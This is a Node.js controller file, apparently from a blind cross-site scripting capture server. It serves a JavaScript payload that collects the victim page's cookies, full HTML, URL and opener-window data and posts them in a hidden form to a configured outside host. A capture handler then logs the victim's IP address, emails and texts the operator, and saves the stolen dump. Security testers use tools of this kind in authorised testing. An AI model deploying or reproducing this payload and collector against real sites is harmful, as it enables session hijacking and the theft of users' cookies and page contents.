const mail = require('../utilities/email');
const sms = require('../utilities/sms');
const process = require('../utilities/process');
const save = require('../utilities/save');
const uuid = require('uuid/v1');
const config = require('../config/config');

exports.displayScript = (req, res) => {
  res.type('.js');
  res.send(`
  (function(){
    if(window.name!=='__'){
  
              try {dcoo = document.cookie} catch(e) {dcoo=null}
              try {inne = document.body.parentNode.innerHTML} catch(e) {inne=null}
              try {durl = document.URL} catch(e) {durl=null}
              try {oloc = opener.location} catch(e) {oloc=null}
              try {oloh = opener.document.body.innerHTML} catch(e) {oloh=null}
              try {odoc = opener.document.cookie} catch(e) {odoc=null}
  
              var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
        var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
              var body = document.getElementsByTagName('body')[0];
  
        __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${config.boundary}'+inne+'\\r\\n\\r\\n${config.boundary}'+durl+'\\r\\n\\r\\n${config.boundary}'+oloc+'\\r\\n\\r\\n${config.boundary}'+oloh+'\\r\\n\\r\\n${config.boundary}'+odoc));
        __.setAttribute('name','_');
        _.appendChild(__);
        _.action='//${config.url}/m';
        _.method='post';
              //_.target='_blank';
  
        body.appendChild(_);
        window.name='__';
        _.submit();
        //history.back();
    } else {window.name=''}
  })();`);
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.capture = (req, res) => {
  if (req.body._) {
    const data = req.body._;
    const rawDump = unescape(data);
    const domain = process.processDomain(rawDump);
    domain.victimIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
    const guid = uuid();

    // Always send email when resource is loaded
    mail.sendMail(guid, domain);
    // check if domain.URL exists or is not null/empty (should always be captured if valid request)
    if (!process.checkExists(domain) && !!domain.URL) {
      console.log(`${domain.URL} doesn't exist saving file`);
      if (!process.lastSave()) {
        console.log(`Sending SMS For URL ${domain.URL}`);
        sms.sendSMS(guid, domain);
        console.log(`Saving To Disk URL ${domain.URL}`);
        save.saveFile(guid, domain);
        res.redirect(domain.URL);
      } else {
        res.redirect(domain.URL);
        console.log('Already sent SMS/Saved to disk today');      
      }
    } else {
      res.redirect(domain.URL);
      console.log(`The domain ${domain.URL} already exists`);

    }
  } else {
    // You always need a meme to spice up code, this feels appropriate
    console.log(`${req.connection.remoteAddress} :| https://www.youtube.com/watch?v=wKbU8B-QVZk`);
    res.send(':-[');
  }
};
